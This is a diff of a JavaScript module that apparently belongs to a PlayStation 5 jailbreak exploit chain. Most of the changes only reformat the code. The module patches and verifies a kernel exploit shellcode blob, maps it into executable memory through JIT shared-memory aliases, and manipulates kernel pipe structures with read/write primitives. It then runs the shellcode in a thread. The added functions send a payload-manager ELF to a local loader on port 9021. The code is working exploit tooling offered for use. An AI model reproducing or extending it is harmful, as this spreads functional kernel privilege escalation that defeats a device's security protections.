@@ -1,8 +1,10 @@
 import { int64 } from "./utils/int64.js";
 
 const O_NONBLOCK = 0x4;
-const PROT_RW = 0x3, PROT_RWX = 0x7;
-const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;
+const PROT_RW = 0x3,
+  PROT_RWX = 0x7;
+const MAP_SHARED = 0x1,
+  MAP_PRIVATE_ANON = 0x1002;
 
 const DEFAULT_KEXP = "kexp_2026_05_25.bin";
 const DEFAULT_ELFLDR = "elfldr-ps5-1360.elf";
@@ -16,9 +18,8 @@ const SHELLCODE = {
   getpid: {
     at: 0x10f1,
     bytes: [
-      0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00,
-      0x48, 0x8d, 0x55, 0xd0, 0xbf, 0x01, 0x20, 0x00, 0x00,
-      0xe8, 0x41, 0x2b, 0x00, 0x00,
+      0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00, 0x48, 0x8d, 0x55, 0xd0, 0xbf,
+      0x01, 0x20, 0x00, 0x00, 0xe8, 0x41, 0x2b, 0x00, 0x00,
     ],
     tail: [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0],
     tailAt: 0x10fb,
@@ -45,12 +46,68 @@ const SHELLCODE = {
   },
 };
 
-const PIPE = { count: 0x00, in: 0x04, out: 0x08, size: 0x0c, buffer: 0x10, defaultSize: 0x4000 };
+const PIPE = {
+  count: 0x00,
+  in: 0x04,
+  out: 0x08,
+  size: 0x0c,
+  buffer: 0x10,
+  defaultSize: 0x4000,
+};
 const FD_ENTRY = { ofiles: 0x08, stride: 0x30, data: 0x00 };
 
+async function connectToElfldr(p, chain) {
+  const address = p.malloc(16);
+  p.write8(address, new int64(0, 0));
+  p.write8(address.add32(8), new int64(0, 0));
+  p.write4(address, 0x3d230210); // AF_INET, port 9021
+  p.write4(address.add32(4), 0x0100007f); // 127.0.0.1
+
+  for (let attempt = 0; attempt < 40; attempt++) {
+    const socket = await chain.syscall(SYS_SOCKET, 2, 1, 0);
+    const fd = socket.low | 0;
+    if (fd >= 0) {
+      const connected = await chain.syscall(SYS_CONNECT, fd, address, 16);
+      if (connected.low >>> 0 === 0) return fd;
+      await chain.syscall(SYS_CLOSE, fd);
+    }
+    await new Promise((resolve) => setTimeout(resolve, 250));
+  }
+
+  throw new Error("elfldr is not listening on port 9021");
+}
+
+async function sendElf(name, payload, p, chain) {
+  const fd = await connectToElfldr(p, chain);
+  try {
+    for (let offset = 0; offset < payload.size; ) {
+      const length = Math.min(0x10000, payload.size - offset);
+      const written =
+        (await chain.syscall(SYS_WRITE, fd, payload.base.add32(offset), length))
+          .low | 0;
+      if (written <= 0) throw new Error(name + " socket write failed");
+      offset += written;
+    }
+  } finally {
+    await chain.syscall(SYS_CLOSE, fd);
+  }
+}
+
+export async function loadOptionalPayloads(p, chain, log) {
+  log("preparing optional payloads");
+  const payloadManager = await mapElf("pldmgr_v0.5.2.elf", p, chain);
+  await sendElf("pldmgr_v0.5.2.elf", payloadManager, p, chain);
+  log("Payload Manager sent");
+}
+
 function readU32(bytes, offset) {
-  return (bytes[offset] | (bytes[offset + 1] << 8) |
-    (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24)) >>> 0;
+  return (
+    (bytes[offset] |
+      (bytes[offset + 1] << 8) |
+      (bytes[offset + 2] << 16) |
+      (bytes[offset + 3] << 24)) >>>
+    0
+  );
 }
 
 function writeU64(bytes, offset, value) {
@@ -66,7 +123,12 @@ function matches(bytes, offset, expected) {
 }
 
 function hex(value) {
-  return "0x" + (value instanceof int64 ? value.toString(16) : (Number(value) >>> 0).toString(16));
+  return (
+    "0x" +
+    (value instanceof int64
+      ? value.toString(16)
+      : (Number(value) >>> 0).toString(16))
+  );
 }
 
 function resolveSymbols(p) {
@@ -93,7 +155,8 @@ function resolveSymbols(p) {
 
 async function fetchBinary(name) {
   const response = await fetch("payloads/" + name);
-  if (!response.ok) throw new Error("kexp: " + name + " returned HTTP " + response.status);
+  if (!response.ok)
+    throw new Error("kexp: " + name + " returned HTTP " + response.status);
   return new Uint8Array(await response.arrayBuffer());
 }
 
@@ -103,7 +166,15 @@ async function mapElf(name, p, chain) {
     throw new Error("kexp: " + name + " is not an ELF");
 
   const size = (elf.length + 0x3fff) & ~0x3fff;
-  const base = await chain.syscall(SYS_MMAP, 0, size, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
+  const base = await chain.syscall(
+    SYS_MMAP,
+    0,
+    size,
+    PROT_RW,
+    MAP_PRIVATE_ANON,
+    -1,
+    0,
+  );
   if (base.low >>> 0 === 0xffffffff || base.low < 0x10000)
     throw new Error("kexp: " + name + " mmap failed");
 
@@ -120,9 +191,15 @@ async function mapElf(name, p, chain) {
 
 function patchShellcode(blob, symbols) {
   if (blob.length !== SHELLCODE.size)
-    throw new Error("kexp: expected " + SHELLCODE.size + " bytes, got " + blob.length);
-  if (SHELLCODE.resolverCalls.some(([offset, bytes]) => !matches(blob, offset, bytes)) ||
-      !matches(blob, SHELLCODE.getpid.at, SHELLCODE.getpid.bytes))
+    throw new Error(
+      "kexp: expected " + SHELLCODE.size + " bytes, got " + blob.length,
+    );
+  if (
+    SHELLCODE.resolverCalls.some(
+      ([offset, bytes]) => !matches(blob, offset, bytes),
+    ) ||
+    !matches(blob, SHELLCODE.getpid.at, SHELLCODE.getpid.bytes)
+  )
     throw new Error("kexp: shellcode signature does not match");
 
   for (const [offset] of SHELLCODE.resolverCalls)
@@ -130,7 +207,9 @@ function patchShellcode(blob, symbols) {
 
   const addressOf = (group, name) => {
     const { base, offsets } = symbols[group];
-    return (BigInt(base.hi) << 32n) + BigInt(base.low >>> 0) + BigInt(offsets[name]);
+    return (
+      (BigInt(base.hi) << 32n) + BigInt(base.low >>> 0) + BigInt(offsets[name])
+    );
   };
   for (const [group, imports] of Object.entries(SHELLCODE.imports))
     for (const [name, offset] of Object.entries(imports))
@@ -140,7 +219,7 @@ function patchShellcode(blob, symbols) {
   blob[at] = 0x48;
   blob[at + 1] = 0xb8;
   writeU64(blob, at + 2, addressOf("libkernel", "getpid"));
-  tail.forEach((byte, index) => blob[tailAt + index] = byte);
+  tail.forEach((byte, index) => (blob[tailAt + index] = byte));
   for (let i = padFrom; i < padTo; i++) blob[i] = 0x90;
 
   for (const offset of SHELLCODE.logCalls)
@@ -158,7 +237,8 @@ async function mapExecutable(blob, p, chain) {
     for (let offset = dwords; offset < blob.length; offset++)
       p.write1(destination.add32(offset), blob[offset]);
     for (let offset = 0; offset < dwords; offset += 4)
-      if (p.read4(destination.add32(offset)) >>> 0 !== readU32(blob, offset)) return false;
+      if (p.read4(destination.add32(offset)) >>> 0 !== readU32(blob, offset))
+        return false;
     return true;
   };
 
@@ -166,7 +246,15 @@ async function mapExecutable(blob, p, chain) {
   if (failed(execFd) || execFd.low >= 0x100000)
     throw new Error("kexp: jitshm_create failed (" + hex(execFd) + ")");
 
-  const entry = await chain.syscall(SYS_MMAP, 0, length, PROT_RWX, MAP_SHARED, execFd, 0);
+  const entry = await chain.syscall(
+    SYS_MMAP,
+    0,
+    length,
+    PROT_RWX,
+    MAP_SHARED,
+    execFd,
+    0,
+  );
   if (failed(entry) || entry.low < 0x10000)
     throw new Error("kexp: executable mmap failed (" + hex(entry) + ")");
 
@@ -175,7 +263,15 @@ async function mapExecutable(blob, p, chain) {
     if (failed(writeFd) || writeFd.low >= 0x100000)
       throw new Error("kexp: writable jitshm alias failed");
 
-    const writable = await chain.syscall(SYS_MMAP, 0, length, PROT_RW, MAP_SHARED, writeFd, 0);
+    const writable = await chain.syscall(
+      SYS_MMAP,
+      0,
+      length,
+      PROT_RW,
+      MAP_SHARED,
+      writeFd,
+      0,
+    );
     if (failed(writable) || writable.low < 0x10000)
       throw new Error("kexp: writable mmap failed (" + hex(writable) + ")");
     if (!copyInto(writable) || p.read4(entry) >>> 0 !== readU32(blob, 0))
@@ -200,7 +296,9 @@ async function makePipePair(p, chain) {
 async function prepareShellcodePipes(krw, master, victim) {
   const table = await krw.read8(krw.procFdAddr);
   const pipeOf = async (fd) => {
-    const file = await krw.read8(table.add32(FD_ENTRY.ofiles + fd * FD_ENTRY.stride));
+    const file = await krw.read8(
+      table.add32(FD_ENTRY.ofiles + fd * FD_ENTRY.stride),
+    );
     return krw.read8(file.add32(FD_ENTRY.data));
   };
 
@@ -219,19 +317,31 @@ async function prepareShellcodePipes(krw, master, victim) {
 
 async function spawnAndJoin(entry, args, symbols, p, chain) {
   const { base, offsets } = symbols.libkernel;
-  const create = offsets.pthread_create_name_np === undefined
-    ? offsets.pthread_create
-    : offsets.pthread_create_name_np;
+  const create =
+    offsets.pthread_create_name_np === undefined
+      ? offsets.pthread_create
+      : offsets.pthread_create_name_np;
   const handle = p.malloc(8);
   const result = p.malloc(8);
   p.write8(handle, 0);
   p.write8(result, 0);
 
-  const created = await chain.call(base.add32(create), handle, new int64(0, 0), entry, args, p.stringify("payload"));
+  const created = await chain.call(
+    base.add32(create),
+    handle,
+    new int64(0, 0),
+    entry,
+    args,
+    p.stringify("payload"),
+  );
   if (created.low >>> 0 !== 0)
     throw new Error("kexp: pthread_create returned " + hex(created));
 
-  const joined = await chain.call(base.add32(offsets.pthread_join), p.read8(handle), result);
+  const joined = await chain.call(
+    base.add32(offsets.pthread_join),
+    p.read8(handle),
+    result,
+  );
   return { joinResult: joined.low >>> 0, shellcodeResult: p.read8(result) };
 }
 
@@ -259,7 +369,8 @@ export async function runKexp(krw, p, chain, log) {
   await prepareShellcodePipes(krw, master, victim);
 
   const args = p.malloc(0x28);
-  for (let offset = 0; offset < 0x28; offset += 8) p.write8(args.add32(offset), 0);
+  for (let offset = 0; offset < 0x28; offset += 8)
+    p.write8(args.add32(offset), 0);
   p.write4(args.add32(0x00), master.readFd);
   p.write4(args.add32(0x04), master.writeFd);
   p.write4(args.add32(0x08), victim.readFd);
